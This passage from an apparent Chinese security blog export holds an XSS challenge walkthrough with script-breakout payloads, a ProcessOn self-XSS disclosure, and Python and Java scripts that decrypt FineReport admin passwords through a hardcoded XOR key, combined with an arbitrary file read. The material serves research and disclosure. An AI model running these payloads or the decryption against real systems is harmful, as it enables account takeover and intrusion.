<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200515101607256.png" alt="image-20200515101607256"></p>
<p>&quot;进行转义后还是”</p>
<p>在 JavaScript 中使用反斜杠来向文本字符串添加特殊字符时都可以使用反斜杠来添加到文本字符串中</p>
<p>可参考：<a href="https://www.w3school.com.cn/js/js_special_characters.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/js/js_special_characters.asp</a></p>
<h5 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;<span class="regexp">/script&gt; &lt;script&gt;alert(1)&lt;/</span>script&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">// 只过滤一次，内嵌一个script</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">\<span class="string">");</span></span><br><span class="line"><span class="string">alert(1);</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// "</span>被转义成\<span class="string">"经过解析后，变成 console.log("</span>\<span class="string">") 会报语法错误, 再补个 \ 即可</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513182714494.png" alt="image-20200513182714494"></p>
<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>payload并不唯一，有多种解法，这里不一一叙述，如有错误还请斧正。</p>
<p>haozi开放式答案：<a href="https://github.com/haozi/xss-demo/issues/1" target="_blank" rel="noopener">https://github.com/haozi/xss-demo/issues/1</a></p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ProcessOn XSS</title>
    <url>/2020/05/10/ProcessOn%20XSS/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p>因想跟团队的小伙伴分享一下当时学习XSS是画的流程图，导出时突然弹出了一个框，无意中发现网站存在Self-XSS…</p>
<a id="more"></a>

<p><img src="/img/Processon-XSS/image-20200510102108198.png" alt="image-20200510102108198"></p>
<h4 id="ProcessOn"><a href="#ProcessOn" class="headerlink" title="ProcessOn"></a>ProcessOn</h4><p>ProcessOn 隶属于北京大麦地信息技术有限公司，是一款专业在线作图工具和分享社区。它支持流程图、思维导图、原型图、网络拓扑图和UML等多种类型的绘制。</p>
<h4 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h4><p>当文本中插入恶意字符，如：<code>&lt;script&gt;alert(&#39;test&#39;)&lt;/script&gt;</code>时，下载文件时会触发js语句从而导致弹框。</p>
<p><img src="/img/Processon-XSS/image-20200510102150613.png" alt="image-20200510102150613"></p>
<p><img src="/img/Processon-XSS/image-20200510102234719.png" alt="image-20200510102234719"></p>
<p>文件标签处（发布需要审核可以盲打~）：</p>
<p><img src="/img/Processon-XSS/image-20200510102520451.png" alt="image-20200510102520451"></p>
<p>这里就不在进一步尝试进行是否可以组合利用扩大影响的测试了，已将相关信息反馈ProcessOn人员。</p>
<p><img src="/img/Processon-XSS/image-20200510105215881.png" alt="image-20200510105215881"></p>
<h4 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h4><p>请遵守《网络安全法》等相关法律法规。</p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>帆软报表（FineReport） privilege.xml管理密码解密</title>
    <url>/2020/04/28/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="什么是FineReport"><a href="#什么是FineReport" class="headerlink" title="什么是FineReport"></a>什么是FineReport</h4><p>FineReport 是帆软软件有限公司自主研发的一款企业级 web 报表软件产品，它“专业、简捷、灵活”，仅需简单的拖拽操作便可以设计出复杂的中国式报表、参数查询报表、填报表、驾驶舱等，轻松搭建数据决策分析系统。</p>
<a id="more"></a>

<h4 id="报表主要配置文件"><a href="#报表主要配置文件" class="headerlink" title="报表主要配置文件"></a>报表主要配置文件</h4><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">config.<span class="built_in">xml</span>文件</span><br><span class="line">保存管理平台和服务器配置中的一些信息</span><br><span class="line"></span><br><span class="line">datasource.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是报表数据连接的一些信息。</span><br><span class="line"></span><br><span class="line">fsconfig.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是op=fs数据决策系统平台属性设置等信息（这是在jar包在<span class="number">20170717</span>之前的老版本里），<span class="number">20170717</span>之后的新版本里，权限信息存储在finedb了。</span><br><span class="line"></span><br><span class="line">functions.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是一些自定义函数的设置。</span><br><span class="line"></span><br><span class="line">privilege.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是管理员账号密码以及管理平台(op=fs)上的权限配置信息（注意，仅仅是保存设置信息，比如是否开启了多级权限及模板权限，不存储具体的权限明细内容）。</span><br><span class="line"></span><br><span class="line">widgets.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是控件管理中定义的预定义控件与自定义控件的信息。</span><br><span class="line"></span><br><span class="line">chartPreStyle.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是图表预定义样式中的信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是内置地图和自定义地图的配置信息，包括地图对应的图片，以二进制形式保存在<span class="built_in">map</span>.<span class="built_in">xml</span>中。</span><br><span class="line">注：这个是位图地图的文件</span><br><span class="line"></span><br><span class="line">web.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是Web工程下面的一些信息。</span><br></pre></td></tr></table></figure>

<h4 id="一个小实例"><a href="#一个小实例" class="headerlink" title="一个小实例"></a>一个小实例</h4><h5 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h5><p>任意文件读取</p>
<p><img src="/img/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/image-20200428145059548.png" alt="image-20200428145059548"></p>
<h5 id="privilege-xml文件"><a href="#privilege-xml文件" class="headerlink" title="privilege.xml文件"></a>privilege.xml文件</h5><p>文件位于\WEB-INF\resources\privilege.xml，该文件保存的是管理员账号密码以及管理平台上的权限配置信息，并使用了硬编码的方式，在Version7.0以上管理密码是进行了加密的，但解密函数已经内置在jar包里了，在这种情况下拿到加密字符串等同于拿到了密码。</p>
<p><img src="/img/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/image-20200428104018863.png" alt="image-20200428104018863"></p>
<h5 id="JAR包里内置的解密"><a href="#JAR包里内置的解密" class="headerlink" title="JAR包里内置的解密"></a>JAR包里内置的解密</h5><p>代码位于com.fr.stable.CodeUtils中</p>
<p><img src="/img/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/image-20200428105150473.png" alt="image-20200428105150473"></p>
<h5 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h5><p>根据jar里的内置方法进行编写解密脚本，以下提供python和java两种解密方式：</p>
<p>Python：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decode</span><span class="params">(Key)</span>:</span></span><br><span class="line">    PassWordArray = [<span class="number">19</span>,<span class="number">78</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">100</span>,<span class="number">213</span>,<span class="number">43</span>,<span class="number">23</span>]</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'密文：'</span>,Key)</span><br><span class="line">    <span class="keyword">if</span> (Key != <span class="literal">None</span> <span class="keyword">and</span> Key.startswith(<span class="string">"___"</span>)):</span><br><span class="line">        Key = Key[<span class="number">3</span>:]</span><br><span class="line">        Text = []</span><br><span class="line">        Step = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,(len(Key) - <span class="number">4</span>) + <span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> (Step == len(PassWordArray)):</span><br><span class="line">                Step = <span class="number">0</span></span><br><span class="line">            str = Key[i:i+<span class="number">4</span>]</span><br><span class="line">            num = int(str,<span class="number">16</span>) ^ PassWordArray[Step]</span><br><span class="line">            Text.append(chr(num))</span><br><span class="line">            Step+=<span class="number">1</span></span><br><span class="line">    Text = <span class="string">''</span>.join(Text)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'解密为：'</span>,Text)</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#密文：___0072002a00670066000a  &gt;&gt; admin</span></span><br><span class="line">    Decode(<span class="string">'___0072002a00670066000a'</span>)</span><br></pre></td></tr></table></figure>

<p>Java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">decode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="keyword">int</span>[] PassWordArray = &#123; <span class="number">19</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">100</span>, <span class="number">213</span>, <span class="number">43</span>, <span class="number">23</span>&#125;;</span><br><span class="line">        String Key = <span class="string">"___0072002a00670066000a"</span>; <span class="comment">// 密文</span></span><br><span class="line">        <span class="keyword">if</span> (Key != <span class="keyword">null</span> &amp;&amp; Key.startsWith(<span class="string">"___"</span>)) &#123;</span><br><span class="line">            Key = Key.substring(<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">final</span> StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">byte</span> Step = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">byte</span> i = <span class="number">0</span>; i &lt;= Key.length() - <span class="number">4</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Step == PassWordArray.length) &#123;</span><br><span class="line">                    Step = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">final</span> String str = Key.substring(i, i + <span class="number">4</span>);</span><br><span class="line">                <span class="keyword">final</span> <span class="keyword">int</span> num = Integer.parseInt(str, <span class="number">16</span>) ^ PassWordArray[Step];</span><br><span class="line">                stringBuilder.append((<span class="keyword">char</span>)num);</span><br><span class="line">                Step++;</span><br><span class="line">            &#125;</span><br><span class="line">            Key = stringBuilder.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p><img src="/img/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/image-20200428114003117.png" alt="image-20200428114003117"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://help.finereport.com/finereport9.0/doc-view-833.html" target="_blank" rel="noopener">https://help.finereport.com/finereport9.0/doc-view-833.html</a></p>
]]></content>
      <tags>
        <tag>FineReport</tag>
      </tags>
  </entry>
  <entry>
    <title>常见的漏洞修复方案（持续更新...）</title>
    <url>/2020/04/23/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0...%EF%BC%89/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码不正确，请重新输入！" data-whm="文章不能被校验, 不过您还是能看看解密后的内容！">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">该文章已受密码保护, 请您输入密码查看。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="15f26df805f1560a47f344d0305a38e584a205e40da07fff52e85404c66188c8">a55468ab90b03478a5f1d8fb0dc23ad475f1fc9f2876232cc61b1bcf55542c0906e0176fc28c63d95ac9663a0108076c7becc792490fb0516abdc65a5618ddfee48c5e6becbd3e273fb5dced89133bf2fa268b49381403729dc4acd343b8430860c1045993668343313c226083a754ddba5bc10d93ce6212dd251db12d81102cb397ff27955c075bdd4a90d720918cede1661373fa1197dbfcb578ffff1e5f182dd9a343b7075b073d2ada2f265bb20e973554a3a7125f478d986471eeb5f085fefa7d4987792b6106c3c58811a3845a49c27f7a4d83ac28cff81021689ae603174b0670cb50782db670fc7c915f580ab63077e9995d8115f684ed4fd00773ba771bd40571233e2e94a8d9b45cd466aab4edc9d803f2c53cdc50c6806f4623f2aa87eb7bd6d8992432a2b5f18ae7160200ff409622f29d51e27bc39ce610a3cc6055395e7eea623c6625cfd9744ff4a1f173545b7f83f0aedd09eecfbaa25655b7240782454973c78cf1616dc7ac9929c70f313987f40d811525c25a732ee25e0bbe2aff211695e45f8d928a552530cabd84bdea504bf719d0169b9296fe68b4caa8239cb7da2cabce1e7ef2030f48997c4ea5a12df8495b782158f5a5053cb3346e6f68dce5e2e4be191f6f6f3fecd798d739379acac000a4764fbd22533b325565d9d298b4f2b6d4dbd27eaa9eb0f1e5673d015b2ed40e3083bbc6d3cfd81f373c69f3121cf107d843d303e204dc8506280a7c65309a5bc1df70b9887c5b7f27d29466476c0a152a2a3b6f8a118efc605da6e17e71d0ef9b6f9f2f2315c734d6d7c3793eae9f9482f3c9e2e14b71a7570336b8f9b882604ce17781360eb7eacd2368341367c561cb1eac74f96d4f18998c9b3573e2e5f56eafd613540ee2a0972cfeecff89c96befadacb64a884d86426359d3d896b498dc5c9838e9c36888094a5a6b1eb6b121998f69ec09cacf7b8b5d96b8655159457ed2b7f07386000a0e569e7ad82acdd185143c26385c690afa84ec290fa051f761d17b2458833adc3b0042722139ce7e9692017be186fc2e993b3e3db18c5804ec5d9467fe6c59c245d4a1963ae2d0993b262630821fb505060fdf9904f0b5b12d72ff509de23510f7e6b3c929d7615078c49f9f39bfbd0195709bd676bde9450f2f73c6d566fc26bd6216aa6b7559919b06ab6f5805d4aab6fda6a73489366b6e8dea10ad048855184cd71a869be65de0a11c7cc515427e4e369574e75bf5be253ead8a398daacb7cf31a4ac0d0bd04f14db59704750d2c05ae0e86d91dd50a8bb6b0109b2f6003f7f6353df8bdbad8ae303a5790bbeb9144d438f546348d3a79fa37d19a9bf34d2e17d670f382bf2abc16e04ebcfccb00da8c379516da573d3474af65d79e0e9afef314b5b563201e7cfee3c61c7a15f02a3073cf03ecf7c8b0cc5383b272c8ea133cbe5f7a35c66f437dc1684342bc3b2dfafd5e181009dc9b41de81d7735ed488d093d11396bb55ab01964b42e770c64df14a64c6859089c396c135769fac21cd867f4c2e72cf17998e50f1eeb03ceaedc0412fd8d1d86ce6f4fe093576d791394b3ac4263a4176b79c3508d95d1f5dd0e68e9b520f3cbe9d42283399f1ac08ab13e924dd45436aca080e629d56f8718be744c576fa35f4da5f7549999a30213a57a424bcca3f7bcd9ae8e870634f99c944bac7d56c0fc2dfedbd63594f838700d3a03a5e772f2c680dbf358964bd6ca72ff41bd20d1abcf4fe7534d11c3e0323cf73e941a4324db85f40b41185348362e3bd96606c56a8a56bcba4eef98379a22c2f24b75e9ee2e5a7440caf3adb64b3a5321dd8d8556fc71143df1fca29d8890a8e4ba02d356df291544c6dfc561bc1f36e4f061d33397b240e047315ec0de5a51b108abc0e752f6917d74d386ccecd58e98fd4f9a26243906eadc91bdee4a906860093c815060f6e71e2b9f57386856368d5858b1ba0529e4882b1e16c19010547eae951de68ac9c7ac7554beb7542d2e7780ef743a6f245e57d167d008b7dfacf25f78eb04f7f0f75fcd0f50a1f40ba6488a5340bfe09be0650fcd82848c36f4bb0a6136e643bd5323bc1a230cc38efc99a5a2b858f42221f0530217072f5e9a3264d52d8bf07677f1f5fb8ee5146431060be8ceb2ed7f987af0b0f29b75c1a824e76d57dde2b63425f71738b3ff67f7e140694b9b48049f519afbef4bfb9e5720bdbe938fd31763c0c6ca3a0761fa2d3bd8e46c3b89c22ffcf285c7261df163623eeaebef08eec7c7215f0246409270ebb9cb66fb64e402131006e9b445203ef5323255080278df5b805eac69bfae6dc4d9fd681127475d35f992681da6d2ea1f0e55c51056acf6fb3d47d683664b06065d23bb793f55bf444f4f2fd292f9bb6a871934bae9cda95d4ac402969caa7d8109496b842ed07595415f332f3d1efdefcec49a8f8abda5bced0c0b38cde1acd3d8de1bdb6c2458c4858191f7f57be914b1b6c800778faddbe9c02f1efea40f1d2453dd89a229917c32198f0b56fb1a4fc78f0064684b51c861995a6263a24174df823cc7a4008ec6a0044febadcb805bf744367ebb1b76b438ac69a274a6864c9509c4aa15fc608ee877d404a412e05f7c8b94c9b03fa7043c2679b616fbc94089b9ad432491b756d462c01d71f1755365a25da70165d1d888f5d5de8e2af96131975b8e9ece520c8becc15f7d8a9fba24902e296bfe794e982bd8cf89f77308fc328d7eff142b6862e6692e1ae3e4bf41fa316f14a35dafa99e1d21c3fba141071c27a93bfeafaf2767db7b47f544dd6a025d1b1ab572584a3612926d4783cf9648830393fa8a7c7a4aef4ff3899525b1227e94a66afbbd4717ce1ce3434a840795b57d87eefcd70b92cdbdd1dffdc7144b9c8e2521d9438d792a9f7e41c8d23b704f229aa026fd18f57d1d9859b0f6e936826f10eea44abf36ba8a8cea298c8e88acbb6653ec2963b2d251bdae95e224045428c5481fb89178ba4efd1d4eb3caf93be1b83dfcefed4ec897e0ee679902193109271ed0b6d5a6adf9d6e9d724d28c6fb3dc872fb5478b0ee80c54195885d7d0505c95c74e311cf2c4e35b04ae91c73b0e32ff553e2ab41b0fa56d267a7f05158474b7af573686b40893f7917ac09a27c058ccc2bd7c418c08dd693eea1fa3f1efccc384ce31dff1cad1a430c4ff883b8ec0828b99748c7225d9cba556ec4b444aa4aa01c4adb4d03e87e5d50d74007813a0e51d79b9179b4632f01f9c8870cb0f0de128632fadde95da127d75702c5a566daa42dc80ed91dab9f38fe871b61cf4d4cc761e8da44feecd9889c3db34fab58e4510b4e3d9968063961d9589bb6f9303e6a3044a8629e633ad1966cff95e06520760fde85e165946f30ce5991a74fc7d9abdadb9e47efd52cb6c6f10118ec1b605a1c7ed279529eb9ab34250a84055bb7906a8453aa4af20deccd82edf0beeb3c47f24c7445a43c06b4ce877b6a06fde2308e12e11357897cc474537fee5d481dd1c72fc2b90eccc7ff0c91aa0167f6242abb383102c6052515a09f45dd51d119d7eda0a92fceb543fee39cf3ac41aa09e8a59e7b5c37218a9c59774a013f658de52cb9853c76bd7c217c7304ca7d9360ffb601d326e7ecd91854f8ea73594051e7f7d603f93e037b1e1138462d1f003f16a32eb67996225726157175810067e224432cb7f344705e132d123b5a8c1f3c7d611978d9231fc124af0e19c8adf76cbddfb668480dc99dc09d141a742f8eb6377b11a2dec2e44b8b670f4154b9489f3acbabfa93e0dcca9e2380733fd5ad2c81317dba11df527791d9ecb8e1004faa9f07b3fa266c3a091b229d689c139ae6a87386ac0d0e67c750406981f9da4eaf536208d50ce6e7a16fc4b49254dfbafd52c1ec301daeedc60fc13de7e791287954585869984bcaae458afbfc3b19d205cfef21f6fbb78c6f0134925895a6d03be90d7213a66813a05abcae38fba62cc29729c755bc22602bb99eac906c31f769b11d90aa799efedc0a62fb452e4a09346b299153a9ce8448b2fe584257891168e2a3409984020edc15987bff882eefc81b2319fbed487355b658e564152c365cb818d3a73173f895aee6260a097ad72cb7540f89f0ea50ae14948ef0bcb51294fc1d69323bd443bbbf0258a7097cef3029d1664c37c4ac81edf213e2d718d77bc517e6546cd2c84e4b8f64bdab93394e9721809c1b95320134c22afb74b5b6401e4b4bef7facf9f55aba4dd17d5d0a2513fe66df1afd5d6c78a2c7ea9a41cd8acf69a8183a1d3bb9e2959c0b905d233ae36e317f26e51c20f9df081b51a808a2e612992ce6fa40ca1ed99f40072ca203d3a99c7a5ccb5cc2994bf54dc68ce5eadd36ab53eb37c8a0f93f9409d2a1b791f379c0ad44d96a5de9cb88a6a1090a81195675393c5408779da9da3bfb5ec8e980470cdaba540538f3c4177e656fb7657e3c9d8460ce15de0276e4d6b3e4f8f4f0a94a6dfdeb13813d5dcfce787c3e5d6ee69c0aac8d4092f1abb8ac56f332fdd6bc4d0fa7c86e1b97886b1c67cf8ced18682586b45cf6f6f3c7b06635a0c23cf30a6562daf35a05af17451d9d7cc4f7609d9529c392c6d861e4488d3609fdebd379ecc854af981d33f8369bb16cf33eb04d4c549e38297442c66aa31115887c9560fc0ad031870c90a0f73ce9bf4848add0bd71ab26dc4d62df6bf26cff76aa8da77d049d80fd99db6ae1aa4e4fc9b039cccefcb92d1c95318d477bd23d71c86ad656a26b97aaf4e03512c36487008fae2bf947a2c15a395715039f7faf371e2982a1c71eb0ecf3182556d031aa5545213d6999d85aab1ba26e748f317c85931db3517c6dfacc9a2b2ab9563eb821d163b6b3496236f86db619eaae0986f2667593f4ebc193b796e621ce8fd0a1c5a2e9fd0bea37c0e28d478d88c13038565c02a493b67980766eec14a23c508bbc9dad03cc0bd6b447692bee78d3ad02662c199a8b912ea2b982a3f13f98c1498a268540d98d5605fa40b35f45e4e4798f5bddba6a9601f73a9706b3b57dbf0ca6eb9e22504e62b1eee1e9e3aeed2a1287ce78db844f7ca8f37f737b02e6ca7eaccf181d91fc6e1cecf6cf10a32cec9bc18f7a0347165e6cff2a74bcad848b3b3ad538cecaf560222a9a3ecf9032b347739707a6c29c845b2a45ac5d23dca86a87d4c81740caac32f2410a9d3fae7d7ded1328648925b7aa6ba00929550beca7fd56dbbcb027e46a4c6312abacf7e36fdc7af294e617e9d43f6d2af2c8d703dffc06cec815a368f0c6b99d93421fab5862fb42b7405908d2ca171942dbacccfb2a30cfea6e8db70104efc1d4477c510c4d14f831dc9f0c701e0305d7462283907929d80a1abcab81b551d019f4b51b9f82660efb368676af8c358a4277ebe3ecda582a6ff311aabb298ca1adc88097537f967e663a712fdba75dc0e96a046129dcfd9023c4e22fd8867f0c9262882c9536f2aba1ac89270f165604e4cf36802700a831a406ee36712955cc7d9c3f88c00806ea972f97938f9dd7b3369352a4876c4e98a727ed78201605d9dee2c7813c84e653d010054842d49ffaafef7f089074e0eda5f737c0627c2958693a8e992c0c3ea9c2097773b28701e8db504a8920e68c6d5a60d879bfc52f03ff643217ea90e74ec13f45dc84013db3b840f23654fc777079286658719bd8dd61b6266886f90dc55e1348ecbbec613ec6ee8064d528a1b76ca76f9bb61477e0a90c635cf1af0f600992e9693719c4a1c39490429642d32bfd44bca0f3a73aa79c51803d427cee56398884d1a8285a4a8c5b17d97bcad9526ce60550f283f21961f7c977f26aa9dd628d4e3a8abb661a193c1fcceeadc22466c599df0671b397fde11206b11ef434dd1d37e3fa6928ad679544d848b94a311b787413f288ad3c85d727a1c4336c77e8a44235fffdc49375dd1f63313f0d23493c57fa783195efbdea71f4cc7d9b59cda4d1d6dd5f7ad12f8c50ba05679642d6769a4c0015c6e7cb257a6d1b5284f52bbfdc90639677f8e2ceb4af4e4da9dfa8ee7a635fa79b0859204ee621f8fe3f3684f53a38e81581e1759249bcbb9efecd7d3604d0ea119d8452d3a7b0ac55db692ad672bf54535568904ac06a9f76fef115c2cd1add0fb3d911355dad60f7586446d9999b770376328b8250ca4d6283031c5486b5aeeb796b33a0ca4bab2391d597f518a5320b014fbbccb80e3cce3880964af64f124387f451b079fd9c410209de7b07487292d8a7cf879a1eaba5921bfb5d97cf6e04a4470b75ad59c018cb498b244a7c55f3d2d9e2512919f35f9d1b62a3d8ea1579cb38553a97f2a64876ff3259ba504644e31af811c1b0afff006f693310d1d967bb4a92e50914fbde6fd1ca432f71f1f05e7829c8ea9ebc0521b1eb8e5f6fd938c9062c866fefcd71aff05aa5724b78f2ea92f507c193c1296bf83a363b7f6fcbf415e2dd45e1664bea2447033bf9809b1a1076dbeb341b0ba54cea89702468484d0aca9dd1e5d2926a2cd5a010f21dbe7dd14153580011b9c2dd7fb1faf82be8eb27280360841a202ddf631c072a0c99fd355722429471923a328b49fd07c0ae3bf6969040a47d51ae51b1610d93541e36fb9630f0b544ea03e286c573d8ec68eb016c57fc0b4a19fe4644b0f2184356e9429e385579ee2984b22505fb251358be52c3b59840773095b0a3f629b8b87718559489898eb40bdf7b37352252a955cc3132eb017cf6cb1ad159114c456f58f53fe2cb24900cf4dae9ce1da67b4f4e184fa81fe127e09964ad862836bb4ee86f6e08ef759a1ca65f8e6df0263f94d98793b2048fc8fa0f351d78758790f35d41f3191d6924fb96852961533375f52874ff7e39c152141281598db8c989a695d9f5adba10bbff000d87237920b8c276e4463340fbb4cfb5a061e8e44ba4633578dc94d02c0e927c832c8e939a4b56cb7ed814a1b4e63501fb92c5d7ba49eaaffa09523ba831a634727958fdf784749d602ede37b9f8e3ada8f331156d3755fe62c361ef5a25a5c5ed6b1010b4e3241d2a80ba3bae8f2ea0d435b920884179e02cae58cca30ee8ae53c319b4824d2fb607fae7d85502d350c62ff1eda67d78c001745fde3f98349f9698512783e4e33c60ab19a95ece8726a01c605b63a09f9d979f4f92940ef41fa8473cbafafddfe20f930c7fbbb001096f37490e658eb3dffcfb79e0c31ded1e8c058dff4b6c0209bbd2d207431439bbef5984ac829378e84ab6ba029518b51cc5c3661a383dd8a6a1d964bc7a239558f73ddc131a2601dcb8afbbebdae531fbd7704785f7b357f8607d0827aa1533e7a3706c03e65603f96b2a51535f0a6257977e74bb7c6b229841e3197009ec95358b54190c29bc8d2f78a6a60fd31b728b47b0549f265a8a4f849373feadb20a5998334376d6eed0a8a116e16293a41c8ab9393dbc3fcb975d05ee399dbd6d7e8c04ef666000d322588348e41afd01b8a9b7b21d210fba59800f775c6bccc2b1026d2133274feb0824d66d074307117496113268a59f26eaa90370f3d5fc7dd516aeee18c8d85b814de6015f77df6f5bfd6405ff3dbb5f44e9f796f6dbd46693e0fc156bafcddb29482d06098e1bc0816f1849bfc7c8418d0ff3563ede4dd66874f685af18a231d26e136c76e6e0e95e7c25ac4adcbe5c7db69965351a04a90286f006cd87aeb07ed509d9e13ae5e94ba614f650977cb0bd53808fda9f809af87fd255e748e0f911d17fa2a819823fe8f006bfba098e4661b2228823eb2d148a8f84d80030435103c695390096996d986e76c2ec7add27bcd9c5391de97d28d4ce431c1752cd2d4e7bf36d51c4245eba607743a899aa2ebc4e691400ed67276474a8fddffd49debd6e2fcffcce3815264300bcc5fc8900afe6d7ac0867e50f1a1a1f29ede41bc0aed0e79fb2f7625de6de5bb2d5e2eedcc4eb4a5e1c80b73b0426e0dd0d446e39388255859a33aa43d33341f07075601526947b825b3759d21a7e30a54443231178172b907a45f37395b6291b6ca25069fd1a950fc6e8ce75aac0dc3150772d3d1de7157e2c68ce762edc65de139441bbb7029b4c89c6f5b6f582d553bd4c88bb05b5a37f9bff0bca373dc9a4fa96c683f06040ad5aa7ffee747a75e8f5fc9a1a3b1ccc3684a23dba43014053f46fc524d94a2e4fb245af02a63937849371e54ef11d6d39df8b1ae49c0f88fb5bd4a8072601c3c9b692cd3efd73d9f2cbb9f690c36dfd01d5f55b0410307b15d7019c5e1113604aa650e04f1f05566cc6ec755eb187a73de1dbebae1cce02b05a1ae867b6d07d3b489561494da84d42c0264b929d6077a5bf2cd7cb33b1caf5424f2e495cc21a194609233ec1d6d396ea59e653b1d35fc4acb91e8ca25e9a01c4e67f4604f3efb2f1130727f7690bcb9d271632e4049a0af89848dc1da91c113a9b116d7c7aa3eb8871a0beb20a77893628a3319525e31e47fbb1421149d0aa42d88f868cbfa83d3e6824c4c17c5ef241ef6f0401a791554492aa5852e4